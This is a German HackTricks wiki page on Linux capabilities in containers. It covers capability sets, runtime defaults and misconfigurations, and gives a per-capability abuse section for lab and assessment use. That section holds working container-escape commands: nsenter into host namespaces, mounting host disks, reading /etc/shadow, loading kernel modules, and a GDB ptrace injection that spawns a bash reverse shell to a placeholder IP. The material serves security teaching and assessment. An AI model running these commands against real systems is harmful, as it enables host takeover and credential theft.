# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

Linux capabilities gehören zu den wichtigsten Bestandteilen der Containersicherheit, denn sie beantworten eine subtile, aber grundlegende Frage: **Was bedeutet „root“ innerhalb eines Containers eigentlich?** Auf einem normalen Linux-System bedeutete UID 0 historisch einen sehr umfassenden Satz an Berechtigungen. In modernen Kernels ist diese Berechtigung in kleinere Einheiten aufgeteilt, die Capabilities genannt werden. Ein Prozess kann als root laufen und trotzdem viele leistungsstarke Operationen nicht ausführen, wenn die entsprechenden Capabilities entfernt wurden. <sup>[[1]](#references)</sup>

Container hängen stark von dieser Unterscheidung ab. Viele Workloads werden aus Gründen der Kompatibilität oder Einfachheit weiterhin als UID 0 innerhalb des Containers gestartet. Ohne das Entfernen von Capabilities wäre das viel zu gefährlich. Werden Capabilities entfernt, kann ein root-Prozess in einem Container weiterhin viele gewöhnliche Aufgaben innerhalb des Containers ausführen, während ihm sensiblere Kernel-Operationen verwehrt bleiben. Deshalb bedeutet eine Container-Shell mit `uid=0(root)` nicht automatisch „host root“ oder auch nur „weitreichende Kernel-Berechtigungen“. Die Capability-Sets bestimmen, wie viel diese root-Identität tatsächlich wert ist.

Die vollständige Linux-Capability-Referenz und zahlreiche Missbrauchsbeispiele finden Sie hier:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funktionsweise

Capabilities werden in mehreren Sets erfasst, darunter permitted, effective, inheritable, ambient und bounding. Bei vielen Container-Assessments sind die genauen Kernel-Semantiken der einzelnen Sets zunächst weniger wichtig als die praktische Frage: **Welche privilegierten Operationen kann dieser Prozess jetzt erfolgreich ausführen, und welche zukünftigen Rechteerweiterungen sind noch möglich?** <sup>[[1]](#references)</sup>

Das ist wichtig, weil viele Breakout-Techniken eigentlich Capability-Probleme sind, die sich als Container-Probleme tarnen. Ein Workload mit `CAP_SYS_ADMIN` kann auf eine Vielzahl von Kernel-Funktionen zugreifen, die ein normaler Container-root-Prozess nicht nutzen sollte. Ein Workload mit `CAP_NET_ADMIN` wird viel gefährlicher, wenn er außerdem den Host-Netzwerk-Namespace gemeinsam nutzt. Ein Workload mit `CAP_SYS_PTRACE` wird deutlich interessanter, wenn er durch die gemeinsame Nutzung der Host-PID-Prozesse Host-Prozesse sehen kann. In Docker oder Podman kann das als `--pid=host` erscheinen; in Kubernetes meist als `hostPID: true`.

Mit anderen Worten: Der Capability-Satz kann nicht isoliert bewertet werden. Er muss gemeinsam mit Namespaces, seccomp und der MAC-Richtlinie betrachtet werden.

## Lab

Eine sehr direkte Möglichkeit, Capabilities innerhalb eines Containers zu prüfen, ist:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Du kannst auch einen stärker eingeschränkten Container mit einem Container vergleichen, dem alle Capabilities hinzugefügt wurden:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Um die Wirkung einer eng begrenzten Ergänzung zu sehen, entfernen Sie alles und fügen Sie nur eine Capability wieder hinzu:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Diese kleinen Experimente zeigen, dass eine Runtime nicht einfach einen Boolean namens „privileged“ umschaltet. Sie formt die tatsächliche Privilegienoberfläche, die dem Prozess zur Verfügung steht.

## Hochriskante Capabilities

Capabilities werden nur dann zu Escape-Primitiven, wenn ihre Operation eine **vom Host kontrollierte Ressource** erreicht. Die wiederkehrenden Hochrisikokombinationen sind:

- **`CAP_SYS_ADMIN`** zusammen mit einer Host-PID, einem Blockgerät oder einem beschreibbaren Kernel-Kontrollpfad. Um zusätzlich einem Ziel-Mount-Namespace beizutreten, ist `CAP_SYS_CHROOT` erforderlich; das Mounten eines blockbasierten Dateisystems erfordert `CAP_SYS_ADMIN` im initialen User-Namespace.
- **`CAP_SYS_PTRACE`** zusammen mit Sichtbarkeit von Host-PIDs und einem angreifbaren Host-Prozess. Für eine ptrace-Injection ist `CAP_SYS_ADMIN` nicht erforderlich.
- **`CAP_DAC_OVERRIDE` oder `CAP_DAC_READ_SEARCH`** zusammen mit einem erreichbaren Host-Dateisystem. Diese Capabilities umgehen unterschiedliche DAC-Prüfungen, erstellen aber keine Sicht auf ein Host-Dateisystem.
- **`CAP_SYS_MODULE`** im initialen User-Namespace zusammen mit einem akzeptierten, kernelkompatiblen Modul. Gewöhnliche Linux-Container teilen sich den Kernel des Hosts; VM- oder Userspace-Kernel-Runtimes verändern diese Grenze.
- **`CAP_MKNOD`** im initialen User-Namespace zusammen mit einem echten Host-Gerät, das die Device-Cgroup bereits zulässt. Das Erstellen eines Geräteknotens umgeht die Device-Cgroup nicht.
- **`CAP_SYS_RAWIO`** zusammen mit einer offengelegten und nutzbaren Speicher-, I/O-Port-, PCI- oder Gerätesteuerungsschnittstelle.
- **`CAP_SYS_BOOT`** zusammen mit dem initialen PID-Namespace, um den Host neu zu starten, oder einem nutzbaren und erlaubten kexec-Pfad zum Ersetzen des Kernels.
- **`CAP_NET_ADMIN`** im Host-Netzwerk-Namespace zur direkten Steuerung des Netzwerkzustands des Knotens. **`CAP_NET_RAW`** kann an einem protokollspezifischen Escape beteiligt sein, aber Raw Sockets allein ergeben keine Shell auf dem Knoten.

`CAP_SYS_CHROOT` ist bewusst nicht als eigenständige Escape-Capability aufgeführt. Sie kann für `setns()` in einen Mount-Namespace erforderlich sein und die Nutzung eines bereits zugänglichen Host-Verzeichnisbaums erleichtern, aber `chroot()` allein macht diesen Verzeichnisbaum weder zugänglich noch gewährt es neue Dateisystemberechtigungen. Ebenso eröffnen `CAP_BPF` und `CAP_PERFMON` eine mächtige Telemetrie- und Kernel-Angriffsfläche, doch ohne einen separaten Kernel-Fehler sind ihre gewöhnlichen Operationen keine generischen Container-Escapes.

## Verwendung durch Runtimes

Docker, Podman, containerd-basierte Stacks und CRI-O verwenden alle Capability-Kontrollen, aber die Standardwerte und Verwaltungsschnittstellen unterscheiden sich. Docker bietet sie direkt über Flags wie `--cap-drop` und `--cap-add` an. Podman bietet ähnliche Kontrollen und kombiniert sie häufig als zusätzliche Sicherheitsebene mit Rootless-Ausführung. Kubernetes stellt das Hinzufügen und Entfernen von Capabilities über den `securityContext` des Pods oder Containers bereit; niedrigere Runtimes legen die resultierenden Sets in der OCI-Runtime-Konfiguration fest. System-Container-Umgebungen wie LXC und Incus setzen ebenfalls auf Capability-Kontrollen, aber ihre umfassendere Host-Integration kann Betreiber dazu verleiten, die Standardwerte stärker zu lockern, als sie es bei einem Anwendungscontainer tun würden. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Für alle gilt dasselbe Prinzip: Eine Capability, die technisch vergeben werden kann, sollte nicht zwangsläufig auch vergeben werden. Viele reale Sicherheitsvorfälle beginnen damit, dass ein Betreiber eine Capability hinzufügt, nur weil ein Workload mit einer strengeren Konfiguration fehlschlug und das Team eine schnelle Lösung brauchte.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker-/Podman-ähnlichen CLIs, aber nicht der einzige. In der Praxis besteht ein häufigeres Problem darin, eine oder zwei extrem mächtige Capabilities, insbesondere `CAP_SYS_ADMIN`, zu vergeben, damit „die Anwendung funktioniert“, ohne zugleich die Auswirkungen auf Namespaces, seccomp und Mounts zu verstehen. Ein weiterer häufiger Fehler ist die Kombination zusätzlicher Capabilities mit gemeinsam genutzten Host-Namespaces. In Docker oder Podman kann sich das als `--pid=host`, `--network=host` oder `--userns=host` äußern; in Kubernetes zeigt sich eine entsprechende Offenlegung üblicherweise durch Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true`. Jede dieser Kombinationen verändert, worauf sich die Capability tatsächlich auswirken kann.

Administratoren gehen außerdem häufig davon aus, dass ein Workload weiterhin sinnvoll eingeschränkt ist, solange er nicht vollständig `--privileged` ausgeführt wird. Manchmal stimmt das, manchmal ist die effektive Sicherheitslage aber bereits so nah an `privileged`, dass der Unterschied im Betrieb keine Rolle mehr spielt.

## Missbrauch

Erfasse zunächst die effektiven Sets, das User-Namespace-Mapping, den seccomp-Status, die Namespaces, Mounts und Geräte. Ein Capability-Name ohne diesen Kontext belegt kein Escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: Namespaces und Blockgeräte

Bei Sichtbarkeit der Host-PIDs kann `CAP_SYS_ADMIN` in Host-Namespaces wechseln. Für die Operation im Mount-Namespace ist außerdem `CAP_SYS_CHROOT` im User-Namespace des Aufrufers erforderlich.

**Capability und Beschränkungen prüfen:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Ziel enumerieren:** Bestätige die gemeinsame Nutzung der Host-PIDs anhand der Container-/Pod-Konfiguration oder einer unverkennbaren Host-Prozessliste und untersuche anschließend die Ziel-Namespaces. Auch in privaten PID-Namespaces gibt es eine lokale PID 1; ihre bloße Existenz beweist daher nicht, dass der Host-PID-Namespace gemeinsam genutzt wird.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Den Namespace-Pfad ausnutzen:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Die Capability-Prüfungen müssen in den User-Namespaces erfolgreich sein, denen die Ziele gehören. `--pid=host` oder Kubernetes `hostPID: true` ermöglicht die Sichtbarkeit, stellt aber nicht die Capabilities bereit.

Für den alternativen Blockgerätepfad **enumerate** zuerst die Kandidaten und **exploit** dann das zugängliche Dateisystem, indem du den validierten Kandidaten zunächst schreibgeschützt mountest:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Der Geräteknoten muss vorhanden sein, die Device-cgroup muss den Zugriff erlauben, und für Mounts von Blockdateisystemen ist `CAP_SYS_ADMIN` im initialen User-Namespace erforderlich. Ein Host-Root-Dateisystem, das bereits unter `/host` bind-gemountet ist, ermöglicht den Zugriff auf den Host **ohne** `CAP_SYS_ADMIN`; `chroot /host` ist lediglich eine Komfortfunktion und erfordert zusätzlich `CAP_SYS_CHROOT`.

### Erreichbares Host-Root-Dateisystem: direkte Ausführung über das Dateisystem

Wenn das Host-Root-Dateisystem bereits unter `/host` eingehängt ist, bestätige zuerst den Mount und nutze dann den bestehenden Zugriff direkt. Dieser Pfad ist nicht von `CAP_SYS_ADMIN` abhängig:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Wenn `chroot()` nicht verfügbar ist, die Host-Binärdatei jedoch mit der Architektur und dem Loader des Containers kompatibel ist, kann sie häufig über den eingehängten Verzeichnisbaum aufgerufen werden:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Direkte Lese- und Schreibzugriffe unter `/host` bedeuten bereits eine Kompromittierung des Host-Dateisystems. `chroot()` oder das Ausführen eines Host-Binaries macht diesen Zugriff lediglich komfortabler; keine der beiden Operationen erstellt den Host-Mount oder umgeht einen schreibgeschützten Mount oder eine MAC-Richtlinie.

### `CAP_SYS_PTRACE`: Host-Prozess-Injection

Mit Sichtbarkeit auf Host-PIDs und `CAP_SYS_PTRACE` im User-Namespace des Ziels kann GDB einen genehmigten Host-Prozess dazu bringen, `system()` aufzurufen. `CAP_SYS_ADMIN` ist nicht erforderlich.

**Capability und Attachment-Kontrollen prüfen:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Ein wegwerfbares Ziel auflisten und auswählen:** Bestätige die gemeinsame Nutzung von Host-PIDs anhand der Konfiguration oder einer eindeutigen Prozessliste des Nodes; wähle niemals PID 1 oder einen kritischen Daemon aus.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Den ausgewählten Prozess ausnutzen:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Das Ziel muss angehängt werden können und über ein verwendbares `system()`-Symbol sowie einen Bash-Payload-Pfad verfügen. Yama, ein nicht dumpbarer Zustand, seccomp, User-Namespaces und MAC-Richtlinien können die Angriffskette blockieren. GDB hält das Ziel während des Anhängens an. Verwende daher nur einen entbehrlichen Laborprozess.

### `CAP_DAC_OVERRIDE` und `CAP_DAC_READ_SEARCH`: geschützte Host-Dateien

Diese Capabilities legen das Host-Dateisystem nicht offen. Wenn `/host` bereits ein Host-Mount ist, kann `CAP_DAC_READ_SEARCH` DAC-Lese-/Suchprüfungen umgehen und `CAP_DAC_OVERRIDE` zusätzlich gewöhnliche Schreibprüfungen umgehen:

**Capabilities prüfen:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Das offengelegte Host-Dateisystem und die Zielberechtigungen auflisten:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Teste die Read- und Write-Bypasses** in einer Wegwerf-Lab-Umgebung:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Ein schreibgeschützter Mount und LSM-Regeln gelten weiterhin. `CAP_DAC_READ_SEARCH` berechtigt außerdem zu `open_by_handle_at()`, aber ein Breakout wie Shocker benötigt zusätzlich einen Mount-Dateideskriptor für dasselbe zugrunde liegende Dateisystem, gültige oder auffindbare Handles, ein kompatibles Dateisystem-/Storage-Layout und darf nicht durch Runtime oder LSM blockiert werden. Die Capability gewährt keinen beliebigen Zugriff auf jedes Dateisystem außerhalb des Mount-Namespace.

### `CAP_SYS_MODULE`: Ausführung im gemeinsam genutzten Kernel

In einem gewöhnlichen Linux-Container wird ein akzeptiertes Modul im gemeinsam genutzten Host-Kernel ausgeführt.

**Prüfe die Capability und den User-Namespace-Geltungsbereich:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Voraussetzungen für das Laden von Modulen aufzählen:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit nur mit einem kompatiblen, vorab geprüften Proof-Modul auf einem Wegwerf-Node:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Die Capability muss im initialen User-Namespace wirksam sein. Kernel-Version und -Konfiguration, Modulsignaturen, Lockdown, seccomp und LSM-Richtlinien müssen das Laden erlauben. Kata, gVisor, Hyper-V-Isolation und ähnliche Runtimes verändern, welche Kernel-Grenze die Workload erreicht.

### `CAP_MKNOD`: einen zulässigen Geräte-Handle erstellen

`CAP_MKNOD` erstellt einen Geräteknoten, umgeht aber nicht die Device-cgroup. Das Erstellen von Geräten ist nicht namespaced, daher muss die Capability im initialen User-Namespace wirksam sein.

**Capability und User-Namespace-Geltungsbereich prüfen:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Liste die tatsächlichen Geräte, ihre Major-/Minor-Nummern und alle sichtbaren cgroup-v1-Allowlists auf:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Einen validierten Kandidaten der ext-Familie read-only exploitieren:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Andere Dateisysteme benötigen ein passendes schreibgeschütztes Tool; zum zusätzlichen Einhängen des Geräts ist außerdem `CAP_SYS_ADMIN` erforderlich. `Operation not permitted` beim Öffnen des erstellten Knotens deutet normalerweise darauf hin, dass die Geräte-cgroup den Zugriff weiterhin blockiert. Unter cgroup v2 wird der Gerätezugriff üblicherweise mit BPF durchgesetzt, und es gibt keine Datei `devices.list`; ein erfolgreicher Öffnungsversuch ist daher der entscheidende Test.

### `CAP_SYS_RAWIO`: offengelegte Raw-I/O-Schnittstelle

Es gibt keinen portablen generischen Payload: Gültige Adressen und Auswirkungen hängen von der Hardware und der Kernel-Konfiguration ab.

**Capability und Geltungsbereich des User-Namespace prüfen:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Offengelegte Rohschnittstellen, Hardware und Treiber auflisten:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Exploit nur mit einem genehmigten Nachweis für das identifizierte Gerät und den Adressbereich.** Wenn `/dev/mem` die im Lab genehmigte Schnittstelle ist, weist diese Vorlage die Offenlegung des Knotenspeichers nach, ohne dessen Inhalt auszugeben:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Die Adresse muss aus der Hardwareübersicht des Labs stammen, da das Lesen mancher MMIO-Regionen Nebenwirkungen haben kann. Ein generischer Speicher-Schreibbefehl wäre irreführend und unsicher: Dieselbe Adresse kann auf einem Rechner harmlos sein und auf einem anderen Hardware oder Kernelspeicher steuern. Device-cgroups, Dateisystemberechtigungen, strenge `/dev/mem`-Beschränkungen, Kernel Lockdown, Virtualisierung und LSM-Richtlinien verhindern häufig einen sinnvollen Zugriff.

### `CAP_SYS_BOOT`: Neustart des Namespace oder Ersetzen des Kernels

In einem privaten PID-Namespace beendet `reboot()` den Init-Prozess dieses Namespace, statt den Host neu zu starten. Ein Neustart des Hosts erfordert daher den Zugriff auf den anfänglichen PID-Namespace, normalerweise durch gemeinsame Nutzung des Host-PID-Namespace. Ein kexec-Pfad benötigt außerdem ein kompatibles Kernel-Image sowie eine permissive Lockdown- und Signaturrichtlinie:

**Capability prüfen:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Die Voraussetzungen für den PID-Namespace und kexec auflisten:** Anhand der Workload-Konfiguration bestätigen, dass die Host-PIDs gemeinsam genutzt werden, da ein Link zu einem PID-Namespace allein nicht erkennen lässt, ob es sich um den initialen Namespace des Nodes handelt.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploit nur dann, wenn der Neustart eines entbehrlichen Laborknotens ausdrücklich Teil der Übung ist:**

```bash
sync
reboot -f
```

Gib diesen Befehl nicht aus und lade keinen Kernel auf einem gemeinsam genutzten Knoten, nur um die Capability nachzuweisen. In einem privaten PID-Namespace beendet er nur den Init-Prozess dieses Namespace und weist keine Auswirkungen auf den Host nach.

### `CAP_NET_ADMIN` und `CAP_NET_RAW`: Netzwerkpfade des Hosts

`CAP_NET_ADMIN` wirkt sich nur auf den aktuellen Network Namespace aus.

**Capabilities und Einschränkungen überprüfen:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Das aktuelle Netzwerk auflisten und den Host-Netzwerkmodus anhand der Workload-Konfiguration bestätigen:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Teste `CAP_NET_ADMIN` reversibel:** Bei Verwendung des Host-Netzwerks ist die temporäre Netzwerkschnittstelle eine Node-Schnittstelle.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` erlaubt RAW- und PACKET-Sockets, ist aber keine allgemeine Host-Shell. Um die dokumentierte GCE-Kette **aufzulisten**, prüfe die Metadatenroute und erfasse, ob Klartextverkehr des Guest Agents beobachtbar ist:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Wenn die passenden Voraussetzungen erfüllt sind, **exploit** die umgebungsspezifische Chain wie unter [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) dokumentiert: Erfasse den Request und den Sequenzzustand, injiziere die gefälschte Metadatenantwort mit einem SSH-Schlüssel und überprüfe anschließend den Host-Zugriff. Für die Chain waren Root, Host-Networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, unverschlüsselter GCE-Metadatenverkehr und ein für eine Race Condition anfälliger Guest-Agent-Request erforderlich; modernes Transport- oder Agent-Verhalten kann sie verhindern.

### Einschränkungen für lokale Ursprünge und Schnittstellenadressen

Ein Listener kann Verbindungen ablehnen, deren Quelle `127.0.0.1` ist, aber eine andere Adresse übersehen, die demselben Netzwerk-Namespace zugewiesen ist. Wenn der Listener über diese Schnittstelle erreichbar ist, vergleiche eine Loopback-Verbindung mit einer Verbindung, die an eine vorhandene lokale Nicht-Loopback-Adresse gebunden ist. `CAP_NET_ADMIN` kann die Konfiguration von Schnittstellen im aktuellen Namespace ermöglichen, ist aber nicht erforderlich, wenn bereits eine passende Adresse zugewiesen ist. `CAP_NET_RAW` ist keine Voraussetzung für eine gewöhnliche TCP-Verbindung. Dies ist ein Fehler bei der Klassifizierung der Quelladresse, kein Container-Escape und kein Beleg dafür, dass die Anwendung eine privilegierte Anfrage autorisiert.<sup>[[1]](#references)[[7]](#references)</sup>

Bei einem WebSocket-Listener zeigt eine gültige HTTP-Antwort `101 Switching Protocols`, dass der Handshake abgeschlossen wurde; ein anschließender Fehler auf Anwendungsebene kann zeigen, dass die Verbindung den Handler erreicht hat. Keine der beiden Antworten beweist, dass die Authentifizierung oder die angeforderte Operation erfolgreich war.<sup>[[8]](#references)</sup>

## Prüfungen

Bei den Capability-Prüfungen geht es nicht nur darum, Rohwerte auszugeben, sondern auch darum zu verstehen, ob der Prozess über genügend Privilegien verfügt, um seine aktuelle Namespace- und Mount-Konfiguration gefährlich zu machen.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Was hier interessant ist:

- `capsh --print` ist der einfachste Weg, risikoreiche Capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die Zeile `CapEff` in `/proc/self/status` zeigt, welche Capabilities aktuell tatsächlich wirksam sind, und nicht nur, welche in anderen Sets verfügbar sein könnten.
- Eine Capability-Ausgabe ist besonders wichtig, wenn der Container außerdem Host-PID-, Netzwerk- oder User-Namespaces gemeinsam nutzt oder beschreibbare Host-Mounts hat.

Nach dem Sammeln der rohen Capability-Informationen folgt die Interpretation. Prüfe, ob der Prozess root ist, ob User-Namespaces aktiv sind, ob Host-Namespaces gemeinsam genutzt werden, ob seccomp greift und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein Capability-Set allein erzählt nur einen Teil der Geschichte, aber oft erklärt es, warum ein Container-Ausbruch funktioniert und ein anderer bei scheinbar denselben Ausgangsbedingungen scheitert.

## Laufzeit-Standards

| Laufzeitumgebung / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig reduziertes Capability-Set | Docker behält eine standardmäßige Allowlist von Capabilities bei und entfernt die übrigen | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Standardmäßig reduziertes Capability-Set | Podman-Container sind standardmäßig nicht privilegiert und verwenden ein reduziertes Capability-Modell | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Übernimmt Laufzeit-Standards, sofern sie nicht geändert werden | Wenn keine `securityContext.capabilities` angegeben sind, erhält der Container das Standard-Capability-Set der Laufzeitumgebung | `securityContext.capabilities.add`, das Weglassen von `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O unter Kubernetes | In der Regel Laufzeit-Standard | Das effektive Set hängt von der Laufzeitumgebung und der Pod-Spezifikation ab | wie in der Kubernetes-Zeile; direkte OCI-/CRI-Konfiguration kann Capabilities ebenfalls explizit hinzufügen |

Für Kubernetes ist wichtig, dass die API kein universelles Standard-Capability-Set definiert. Wenn der Pod keine Capabilities hinzufügt oder entfernt, übernimmt die Workload den Laufzeit-Standard des jeweiligen Nodes.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux-Containerkonfiguration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker-Dokumentation - Laufzeitprivilegien und Linux-Capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes-Dokumentation - Capabilities für einen Container festlegen](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman-Dokumentation - `--cap-add` und `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus-Dokumentation - Sicherheit](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux-IPv4-Protokollimplementierung](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - Das WebSocket-Protokoll](https://www.rfc-editor.org/rfc/rfc6455.html)
